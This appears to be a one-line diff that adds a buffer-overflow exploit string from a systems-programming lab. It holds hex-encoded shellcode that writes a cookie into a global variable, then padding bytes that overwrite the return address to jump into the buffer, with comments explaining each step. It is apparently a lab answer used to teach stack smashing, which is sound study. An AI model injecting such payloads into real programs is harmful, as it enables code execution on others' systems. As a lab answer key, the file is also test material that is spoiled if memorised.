@@ -1,0 +1,1 @@
+c7 05 04 c2 04 08 34 e7 23 7b c3 /* move cookie into global_value and then return */ 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 18 34 68 55 /* overloads buffer unti return address is set at start of buffer */ 43 91 04 08 /* manually pushes new return address (happy) to stack */
